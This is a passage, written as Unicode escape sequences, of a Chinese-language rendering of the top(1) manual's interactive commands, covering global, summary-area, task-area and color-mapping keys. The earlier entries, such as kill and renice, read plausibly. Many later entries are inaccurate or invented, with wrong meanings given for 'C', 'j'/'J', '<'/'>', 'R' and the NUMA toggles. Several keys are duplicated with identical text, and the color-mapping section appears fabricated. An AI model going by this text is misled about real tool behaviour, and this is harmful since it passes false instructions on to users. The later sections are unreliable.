`v`\uff08\u9690\u85cf\u5b50\u8fdb\u7a0b\uff09\u547d\u4ee4\u3002 \u5b83\u8fd8\u63d0\u4f9b\u9000\u51fa PID \u76d1\u63a7\u3001\u7528\u6237\u8fc7\u6ee4\u3001\u5176\u4ed6\u8fc7\u6ee4\u3001\u5b9a\u4f4d\u5904\u7406\u548c\u7ec4\u5408 CPU \u6a21\u5f0f\u3002 \u6b64\u5916\uff0c\u5982\u679c\u7a97\u53e3\u5df2\u6eda\u52a8\uff0c\u5c06\u4f7f\u7528\u6b64\u547d\u4ee4\u91cd\u7f6e\u3002 0 :\u96f6\u6291\u5236\u5207\u6362 \u6b64\u547d\u4ee4\u786e\u5b9a\u662f\u5426\u663e\u793a\u8bb8\u591a\u5b57\u6bb5\u4e2d\u7684\u96f6\u3002\u50cf UID\u3001GID\u3001NI\u3001PR \u6216 P \u7b49\u5b57\u6bb5\u4e0d\u53d7\u6b64\u5207\u6362\u7684\u5f71\u54cd\u3002 A :\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e4b\u95f4\u5207\u6362\u3002\u8bf7\u53c2\u89c1\u4e3b\u9898 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879\u548c `g` \u4ea4\u4e92\u547d\u4ee4\uff0c \u4e86\u89e3\u201c\u5f53\u524d\u201d\u7a97\u53e3\u548c\u5b57\u6bb5\u7ec4\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 B :\u52a0\u7c97\u7981\u7528/\u542f\u7528\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5f71\u54cd\u7c97\u4f53 terminfo \u529f\u80fd\u7684\u4f7f\u7528\uff0c\u5e76\u6539\u53d8\u201c\u5f53\u524d\u201d\u7a97\u53e3\u7684\u6458\u8981\u533a\u57df\u548c\u4efb\u52a1\u533a\u57df\u3002\u867d\u7136\u4e3b\u8981\u7528\u4e8e\u54d1\u7ec8\u7aef\uff0c \u4f46\u53ef\u4ee5\u968f\u65f6\u5e94\u7528\u3002 \u6ce8\u610f\uff1a\u5f53\u6b64\u5207\u6362\u5f00\u542f\u4e14 top \u5728\u5355\u8272\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0c\u6574\u4e2a\u663e\u793a\u5c06\u663e\u793a\u4e3a\u666e\u901a\u6587\u672c\u3002\u56e0\u6b64\uff0c\u9664\u975e `x` \u548c/\u6216 `y` \u5207\u6362\u4f7f\u7528\u53cd\u8f6c\u4ee5\u5f3a\u8c03\uff0c\u5426\u5219\u5c06\u6ca1\u6709\u89c6\u89c9\u786e\u8ba4\u5b83\u4eec\u662f\u5426\u5f00\u542f\u3002 * d | s :\u66f4\u6539\u5ef6\u8fdf\u65f6\u95f4\u95f4\u9694 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u663e\u793a\u66f4\u65b0\u4e4b\u95f4\u7684\u5ef6\u8fdf\u65f6\u95f4\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002 \u5206\u6570\u79d2\u662f\u6709\u6548\u7684\uff0c\u4f46\u4e0d\u5141\u8bb8\u8d1f\u6570\u3002\u8f93\u5165 0 \u4f1a\u5bfc\u81f4\uff08\u51e0\u4e4e\uff09\u8fde\u7eed\u66f4\u65b0\uff0c\u56e0\u4e3a\u7cfb\u7edf\u548c tty \u9a71\u52a8\u7a0b\u5e8f\u5c1d\u8bd5\u8ddf\u4e0a top \u7684\u9700\u6c42\uff0c\u663e\u793a\u5c06\u4e0d\u6ee1\u610f\u3002 \u5ef6\u8fdf\u503c\u4e0e\u7cfb\u7edf\u8d1f\u8f7d\u6210\u53cd\u6bd4\uff0c\u56e0\u6b64\u8bf7\u8c28\u614e\u8bbe\u7f6e\u3002 \u5982\u679c\u4f60\u60f3\u968f\u65f6\u77e5\u9053\u5f53\u524d\u7684\u5ef6\u8fdf\u65f6\u95f4\uff0c\u53ea\u9700\u8bf7\u6c42\u5e2e\u52a9\u5e76\u67e5\u770b\u7b2c\u4e8c\u884c\u4e0a\u7684\u7cfb\u7edf\u6458\u8981\u3002 E :\u5f3a\u5236\u6458\u8981\u5185\u5b58\u7f29\u653e \u4f7f\u7528\u6b64\u547d\u4ee4\u53ef\u4ee5\u5faa\u73af\u6458\u8981\u533a\u57df\u7684\u5185\u5b58\u7f29\u653e\uff0c\u8303\u56f4\u4ece KiB\uff08\u5343\u5b57\u8282\u6216 1024 \u5b57\u8282\uff09\u5230 EiB\uff08\u827e\u5b57\u8282\u6216 1,152,921,504,606,846,976 \u5b57\u8282\uff09\u3002 \u5982\u679c\u4f60\u5728\u663e\u793a\u7684\u6570\u5b57\u548c\u540e\u9762\u7684\u6807\u7b7e\u4e4b\u95f4\u770b\u5230\u4e00\u4e2a `+`\uff0c\u8fd9\u610f\u5473\u7740 top \u88ab\u8feb\u622a\u65ad\u4e86\u8be5\u6570\u5b57\u7684\u4e00\u90e8\u5206\u3002\u901a\u8fc7\u63d0\u9ad8\u7f29\u653e\u56e0\u5b50\uff0c\u53ef\u4ee5\u907f\u514d\u8fd9\u79cd\u622a\u65ad\u3002 e :\u5f3a\u5236\u4efb\u52a1\u5185\u5b58\u7f29\u653e \u4f7f\u7528\u6b64\u547d\u4ee4\u53ef\u4ee5\u5faa\u73af\u4efb\u52a1\u533a\u57df\u7684\u5185\u5b58\u7f29\u653e\uff0c\u8303\u56f4\u4ece KiB\uff08\u5343\u5b57\u8282\u6216 1024 \u5b57\u8282\uff09\u5230 PiB\uff08\u62cd\u5b57\u8282\u6216 1,125,899,906,842,624 \u5b57\u8282\uff09\u3002 \u867d\u7136 top \u5c06\u5c3d\u529b\u9075\u5b88\u9009\u5b9a\u7684\u76ee\u6807\u8303\u56f4\uff0c\u4f46\u4e3a\u4e86\u9002\u5e94\u5f53\u524d\u503c\uff0c\u53ef\u80fd\u4ecd\u9700\u8981\u989d\u5916\u7684\u7f29\u653e\u3002\u5982\u679c\u4f60\u5e0c\u671b\u5728\u5185\u5b58\u5217\u4e2d\u770b\u5230\u66f4\u5747\u5300\u7684\u7ed3\u679c\uff0c\u63d0\u9ad8\u7f29\u653e\u8303\u56f4\u901a\u5e38\u53ef\u4ee5\u5b9e\u73b0\u8be5\u76ee\u6807\u3002 \u4f46\u5982\u679c\u63d0\u9ad8\u8fc7\u9ad8\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u5168\u96f6\u7ed3\u679c\uff0c\u65e0\u6cd5\u4f7f\u7528 `0` \u4ea4\u4e92\u547d\u4ee4\u6291\u5236\u3002 g :\u9009\u62e9\u5176\u4ed6\u7a97\u53e3/\u5b57\u6bb5\u7ec4 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u4ecb\u4e8e 1 \u548c 4 \u4e4b\u95f4\u7684\u6570\u5b57\uff0c\u4ee5\u6307\u5b9a\u5e94\u4f5c\u4e3a\u201c\u5f53\u524d\u201d\u7a97\u53e3\u7684\u5b57\u6bb5\u7ec4\u3002\u968f\u7740\u4f60\u5bf9\u8fd9 4 \u4e2a\u7a97\u53e3\u7684\u719f\u6089\uff0c \u7279\u522b\u662f\u5728\u5c1d\u8bd5\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u540e\uff0c\u4f60\u4f1a\u5f88\u5feb\u719f\u6089\u8fd9\u4e9b\u7a97\u53e3\u3002 H :\u7ebf\u7a0b\u6a21\u5f0f\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u5c06\u663e\u793a\u6240\u6709\u8fdb\u7a0b\u7684\u5355\u4e2a\u7ebf\u7a0b\u3002\u5426\u5219\uff0ctop \u663e\u793a\u6bcf\u4e2a\u8fdb\u7a0b\u4e2d\u6240\u6709\u7ebf\u7a0b\u7684\u6c47\u603b\u3002 I :Irix/Solaris \u6a21\u5f0f\u5207\u6362 \u5f53\u5728 Solaris \u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff08`I` \u5207\u6362\u5173\u95ed\uff09\uff0c\u4efb\u52a1\u7684 CPU \u4f7f\u7528\u91cf\u5c06\u9664\u4ee5 CPU \u603b\u6570\u3002\u53d1\u51fa\u6b64\u547d\u4ee4\u540e\uff0c\u4f60\u5c06\u88ab\u544a\u77e5\u6b64\u5207\u6362\u7684\u65b0\u72b6\u6001\u3002 * k :\u6740\u6b7b\u4efb\u52a1 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a PID\uff0c\u7136\u540e\u662f\u8981\u53d1\u9001\u7684\u4fe1\u53f7\u3002 \u4e0d\u8f93\u5165 PID \u6216\u8f93\u5165\u8d1f\u6570\u5c06\u88ab\u89e3\u91ca\u4e3a\u63d0\u793a\u4e2d\u663e\u793a\u7684\u9ed8\u8ba4\u503c\uff08\u663e\u793a\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1\uff09\u3002PID \u503c\u4e3a\u96f6\u8868\u793a top \u7a0b\u5e8f\u672c\u8eab\u3002 \u9ed8\u8ba4\u4fe1\u53f7\u5982\u63d0\u793a\u4e2d\u6240\u793a\u662f SIGTERM\u3002\u7136\u800c\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u6570\u5b57\u6216\u540d\u79f0\u53d1\u9001\u4efb\u4f55\u4fe1\u53f7\u3002 \u5982\u679c\u4f60\u5e0c\u671b\u4e2d\u6b62\u6740\u6b7b\u8fdb\u7a0b\u7684\u64cd\u4f5c\uff0c\u8bf7\u6839\u636e\u8fdb\u5ea6\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u4e4b\u4e00\uff1a 1) \u5728 PID \u63d0\u793a\u4e2d\uff0c\u952e\u5165\u65e0\u6548\u6570\u5b57 2) \u5728\u4fe1\u53f7\u63d0\u793a\u4e2d\uff0c\u952e\u5165 0\uff08\u6216\u4efb\u4f55\u65e0\u6548\u4fe1\u53f7\uff09 3) \u5728\u4efb\u4f55\u63d0\u793a\u4e2d\uff0c\u952e\u5165 <Esc> q :\u9000\u51fa * r :\u8c03\u6574\u4efb\u52a1\u4f18\u5148\u7ea7 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a PID\uff0c\u7136\u540e\u662f\u8981\u8c03\u6574\u7684\u4f18\u5148\u503c\u3002 \u4e0d\u8f93\u5165 PID \u6216\u8f93\u5165\u8d1f\u6570\u5c06\u88ab\u89e3\u91ca\u4e3a\u63d0\u793a\u4e2d\u663e\u793a\u7684\u9ed8\u8ba4\u503c\uff08\u663e\u793a\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1\uff09\u3002PID \u503c\u4e3a\u96f6\u8868\u793a top \u7a0b\u5e8f\u672c\u8eab\u3002 \u6b63\u7684\u4f18\u5148\u503c\u5c06\u4f7f\u8fdb\u7a0b\u964d\u4f4e\u4f18\u5148\u7ea7\u3002\u76f8\u53cd\uff0c\u8d1f\u7684\u4f18\u5148\u503c\u5c06\u4f7f\u8fdb\u7a0b\u66f4\u53d7\u5185\u6838\u9752\u7750\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u666e\u901a\u7528\u6237\u53ea\u80fd\u589e\u52a0\u4f18\u5148\u503c\uff0c\u65e0\u6cd5\u964d\u4f4e\u3002 \u5982\u679c\u4f60\u5e0c\u671b\u4e2d\u6b62\u8c03\u6574\u4f18\u5148\u7ea7\u7684\u64cd\u4f5c\uff0c\u8bf7\u6839\u636e\u8fdb\u5ea6\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u4e4b\u4e00\uff1a 1) \u5728 PID \u63d0\u793a\u4e2d\uff0c\u952e\u5165\u65e0\u6548\u6570\u5b57 2) \u5728\u4f18\u5148\u503c\u63d0\u793a\u4e2d\uff0c\u6309 <Enter> \u952e\u4e0d\u8f93\u5165\u4efb\u4f55\u5185\u5bb9 3) \u5728\u4efb\u4f55\u63d0\u793a\u4e2d\uff0c\u952e\u5165 <Esc> W :\u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u8fd9\u5c06\u4fdd\u5b58\u6240\u6709\u9009\u9879\u548c\u5207\u6362\u52a0\u4e0a\u5f53\u524d\u663e\u793a\u6a21\u5f0f\u548c\u5ef6\u8fdf\u65f6\u95f4\u3002\u901a\u8fc7\u5728\u9000\u51fa top \u4e4b\u524d\u53d1\u51fa\u6b64\u547d\u4ee4\uff0c\u4f60\u5c06\u80fd\u591f\u5728\u5b8c\u5168\u76f8\u540c\u7684\u72b6\u6001\u4e0b\u91cd\u65b0\u542f\u52a8\u3002 X :\u989d\u5916\u56fa\u5b9a\u5bbd\u5ea6 \u67d0\u4e9b\u5b57\u6bb5\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\uff0c\u4e0d\u53ef\u7f29\u653e\u3002\u56e0\u6b64\uff0c\u5b83\u4eec\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\uff0c\u8868\u793a\u4e3a\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\u7684 `+`\u3002 \u6b64\u4ea4\u4e92\u547d\u4ee4\u53ef\u7528\u4e8e\u66f4\u6539\u4ee5\u4e0b\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff1a \u5b57\u6bb5 \u9ed8\u8ba4 \u5b57\u6bb5 \u9ed8\u8ba4 \u5b57\u6bb5 \u9ed8\u8ba4 GID 5 GROUP 8 WCHAN 10 RUID 5 LXC 8 nsIPC 10 SUID 5 RUSER 8 nsMNT 10 UID 5 SUSER 8 nsNET 10 TTY 8 nsPID 10 USER 8 nsUSER 10 nsUTS 10 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u8981 \u66f4\u6539\u7684\u5b57\u6bb5\u540d\u3002\u53ef\u4ee5\u63d0\u4f9b\u4efb\u4f55\u6709\u6548\u7684\u56fa\u5b9a\u5bbd\u5ea6\u5b57\u6bb5\u540d\u79f0\uff0c\u6216\u952e\u5165 <Esc> \u9000\u51fa\u6b64\u547d\u4ee4\u3002\u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u4ecb\u4e8e 1 \u548c 40 \u4e4b\u95f4\u7684\u6570\u5b57\u3002\u8be5\u6570\u5b57\u51b3\u5b9a\u65b0\u5bbd\u5ea6\uff0c\u5e76\u7acb\u5373\u5e94\u7528\u3002 Y :\u5176\u4ed6\u8fc7\u6ee4 \u4f7f\u7528\u6b64\u547d\u4ee4\u53ef\u4ee5\u8f7b\u677e\u5bf9\u4efb\u52a1\u8fdb\u884c\u4e34\u65f6\u8fc7\u6ee4\u3002 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5b57\u6bb5\u540d\uff08\u4f8b\u5982\uff0c'COMMAND'\uff09\u3002\u5982\u679c\u5b57\u6bb5\u540d\u65e0\u6548\uff0c\u5f53\u524d\u7a97\u53e3\u7684\u6240\u6709\u5b57\u6bb5\u540d\u5c06\u4f5c\u4e3a\u4e0a\u4e0b\u6587\u63d0\u793a\u8fdb\u884c\u663e\u793a\u3002 \u8f93\u5165\u5b57\u6bb5\u540d\u540e\uff0c\u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u503c\u3002\u8be5\u503c\u5c06\u4e0e\u5b57\u6bb5\u7684\u5185\u5bb9\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ea\u6709\u90a3\u4e9b\u5339\u914d\u7684\u4efb\u52a1\u624d\u4f1a\u88ab\u663e\u793a\u3002 \u6709\u5173\u6b64\u547d\u4ee4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `&` \u4ea4\u4e92\u547d\u4ee4\u548c\u4e3b\u9898 5e. \u7a97\u53e3\u641c\u7d22\u3002 Z :\u989c\u8272\u6620\u5c04\u5f00\u5173 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u5982\u679c\u7981\u7528\u989c\u8272\u6620\u5c04\uff0c\u5c06\u4e0d\u4f1a\u663e\u793a\u4efb\u4f55\u989c\u8272\u3002 \u53ef\u4ee5\u4f7f\u7528 0 \u5230 7 \u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 \u6709\u5173\u6b64\u547d\u4ee4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4d. \u989c\u8272\u6620\u5c04\u3002 4b. \u6458\u8981\u533a\u57df\u547d\u4ee4 \u6458\u8981\u533a\u57df\u547d\u4ee4\u53ea\u5f71\u54cd\u7a97\u53e3\u7684\u6458\u8981\u90e8\u5206\u3002\u5b83\u4eec\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u5747\u53ef\u7528\u3002 C :\u7528\u6237\u548c\u7ec4 ID \u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5f71\u54cd\u4efb\u52a1\u533a\u57df\u4e2d\u663e\u793a\u7684\u7528\u6237\u548c\u7ec4 ID\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ctop \u663e\u793a\u4efb\u52a1\u7684\u7528\u6237\u540d\u548c\u7ec4\u540d\u3002\u6b64\u5207\u6362\u5c06\u5b83\u4eec\u5207\u6362\u4e3a\u5b9e\u9645 ID\u3002 l :\u8d1f\u8f7d\u5e73\u5747\u503c\u548c\u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u8d1f\u8f7d\u5e73\u5747\u503c\u548c\u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u3002 t :\u4efb\u52a1\u548c CPU \u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u4efb\u52a1\u548c CPU \u72b6\u6001\u3002 m :\u5185\u5b58\u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u5185\u5b58\u72b6\u6001\u3002 1 :\u5355/\u591a CPU \u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5355\u4e2a CPU \u7684\u72b6\u6001\u663e\u793a\u5207\u6362\u4e3a\u6240\u6709 CPU \u7684\u72b6\u6001\u663e\u793a\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 2 :NUMA \u8282\u70b9\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2a CPU \u72b6\u6001\u884c\u7684\u663e\u793a\u987a\u5e8f\u5c06\u9075\u5faa NUMA \u8282\u70b9\u7684\u987a\u5e8f\u3002\u6b64\u987a\u5e8f\u5728 NUMA \u673a\u5668\u4e0a\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\u3002 3 :NUMA \u8282\u70b9\u989c\u8272\u6620\u5c04\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2a CPU \u72b6\u6001\u884c\u5c06\u4f7f\u7528\u4e0d\u540c\u7684\u989c\u8272\u6620\u5c04\uff0c\u4ee5\u4fbf\u66f4\u5bb9\u6613\u533a\u5206\u3002 4 :NUMA \u8282\u70b9\u5e03\u5c40\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0cCPU \u72b6\u6001\u884c\u5c06\u6839\u636e NUMA \u8282\u70b9\u8fdb\u884c\u5206\u7ec4\u548c\u663e\u793a\u3002 ! :\u4ea4\u4e92\u547d\u4ee4\u53d6\u6d88 \u6b64\u547d\u4ee4\u5c06\u53d6\u6d88\u4efb\u4f55\u672a\u5b8c\u6210\u7684\u4ea4\u4e92\u547d\u4ee4\uff0c\u5e76\u8fd4\u56de\u5230\u6b63\u5e38\u7684 top \u64cd\u4f5c\u3002 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4 \u4efb\u52a1\u533a\u57df\u547d\u4ee4\u53ea\u5f71\u54cd\u7a97\u53e3\u7684\u4efb\u52a1\u663e\u793a\u90e8\u5206\u3002\u5b83\u4eec\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u5747\u53ef\u7528\u3002 \u5916\u89c2: b :\u7c97\u4f53\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5f71\u54cd\u7c97\u4f53 terminfo \u529f\u80fd\u7684\u4f7f\u7528\uff0c\u5e76\u6539\u53d8\u4efb\u52a1\u533a\u57df\u7684\u663e\u793a\u3002 J :\u5217\u79fb\u52a8 \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u9009\u62e9\u7684\u5217\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u3002 j :\u5217\u79fb\u52a8 \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u9009\u62e9\u7684\u5217\u79fb\u52a8\u5230\u4e0a\u4e00\u4e2a\u4f4d\u7f6e\u3002 x :\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7a81\u51fa\u663e\u793a\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u7a81\u51fa\u663e\u793a\u5f53\u524d\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 y :\u4efb\u52a1\u7a97\u53e3\u884c\u7a81\u51fa\u663e\u793a\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u7a81\u51fa\u663e\u793a\u4efb\u52a1\u7a97\u53e3\u4e2d\u7684\u6bcf\u4e00\u884c\u3002 z :\u4efb\u52a1\u7a97\u53e3\u989c\u8272\u6620\u5c04\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7a97\u53e3\u5207\u6362\u4e3a\u4f7f\u7528\u4e0d\u540c\u7684\u989c\u8272\u6620\u5c04\u3002 \u5185\u5bb9: c :\u547d\u4ee4\u884c/\u7a0b\u5e8f\u540d\u79f0\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7684\u547d\u4ee4\u884c\u663e\u793a\u5207\u6362\u4e3a\u7a0b\u5e8f\u540d\u79f0\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 f :\u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u54ea\u4e9b\u5b57\u6bb5\u663e\u793a\uff0c\u54ea\u4e9b\u5b57\u6bb5\u7528\u4e8e\u6392\u5e8f\u3002 F :\u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u54ea\u4e9b\u5b57\u6bb5\u663e\u793a\uff0c\u54ea\u4e9b\u5b57\u6bb5\u7528\u4e8e\u6392\u5e8f\u3002 o :\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 O :\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 S :\u7d2f\u79ef\u65f6\u95f4\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7684\u7d2f\u79ef\u65f6\u95f4\u663e\u793a\u5207\u6362\u4e3a\u975e\u7d2f\u79ef\u65f6\u95f4\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 u :\u7528\u6237\u8fc7\u6ee4 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u8fc7\u6ee4\u4e3a\u7279\u5b9a\u7528\u6237\u3002 U :\u7528\u6237\u8fc7\u6ee4 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u8fc7\u6ee4\u4e3a\u7279\u5b9a\u7528\u6237\u3002 V :\u6811\u72b6\u89c6\u56fe\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u5207\u6362\u4e3a\u6811\u72b6\u89c6\u56fe\uff0c\u663e\u793a\u4efb\u52a1\u7684\u7236\u5b50\u5173\u7cfb\u3002 v :\u5b50\u8fdb\u7a0b\u9690\u85cf\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u4efb\u52a1\u7684\u5b50\u8fdb\u7a0b\u3002 \u5927\u5c0f: # :\u4efb\u52a1\u6570\u91cf\u9650\u5236 \u6b64\u547d\u4ee4\u5c06\u9650\u5236\u663e\u793a\u7684\u4efb\u52a1\u6570\u91cf\u3002 i :\u7a7a\u95f2\u4efb\u52a1\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u7a7a\u95f2\u4efb\u52a1\u3002 n :\u4efb\u52a1\u6570\u91cf\u9650\u5236 \u6b64\u547d\u4ee4\u5c06\u9650\u5236\u663e\u793a\u7684\u4efb\u52a1\u6570\u91cf\u3002 \u6392\u5e8f: < :\u53cd\u5411\u6392\u5e8f \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7684\u6392\u5e8f\u987a\u5e8f\u53cd\u8f6c\u3002 > :\u53cd\u5411\u6392\u5e8f \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7684\u6392\u5e8f\u987a\u5e8f\u53cd\u8f6c\u3002 f :\u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 F :\u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 R :\u9ed8\u8ba4\u6392\u5e8f\u6062\u590d \u6b64\u547d\u4ee4\u5c06\u6392\u5e8f\u6062\u590d\u4e3a\u9ed8\u8ba4\u6392\u5e8f\u5b57\u6bb5\u548c\u987a\u5e8f\u3002 4d. \u989c\u8272\u6620\u5c04 \u989c\u8272\u6620\u5c04\u547d\u4ee4\u53ea\u5728\u989c\u8272\u6620\u5c04\u6a21\u5f0f\u4e0b\u53ef\u7528\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `Z` \u4ea4\u4e92\u547d\u4ee4\u548c `z` \u4ea4\u4e92\u547d\u4ee4\u3002 <Ret> :\u989c\u8272\u6620\u5c04\u9009\u62e9 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u53ef\u4ee5\u4f7f\u7528 0 \u5230 7 \u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 a :\u989c\u8272 A \u9009\u62e9\u989c\u8272\u6620\u5c04 A\u3002 B :\u989c\u8272 B \u9009\u62e9\u989c\u8272\u6620\u5c04 B\u3002 b :\u989c\u8272 B \u9009\u62e9\u989c\u8272\u6620\u5c04 B\u3002 H :\u9ad8\u4eae\u989c\u8272 \u9009\u62e9\u9ad8\u4eae\u989c\u8272\u3002 M :\u666e\u901a\u989c\u8272 \u9009\u62e9\u666e\u901a\u989c\u8272\u3002 q :\u9000\u51fa\u989c\u8272\u6620\u5c04 \u9000\u51fa\u989c\u8272\u6620\u5c04\u9009\u62e9\u3002 S :\u4fdd\u5b58\u989c\u8272\u6620\u5c04 \u4fdd\u5b58\u5f53\u524d\u7684\u989c\u8272\u6620\u5c04\u8bbe\u7f6e\u3002 T :\u5207\u6362\u989c\u8272\u6620\u5c04 \u5207\u6362\u989c\u8272\u6620\u5c04\u3002 w :\u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u5c06\u5f53\u524d\u989c\u8272\u6620\u5c04\u8bbe\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 z :\u5207\u6362\u989c\u8272\u6620\u5c04 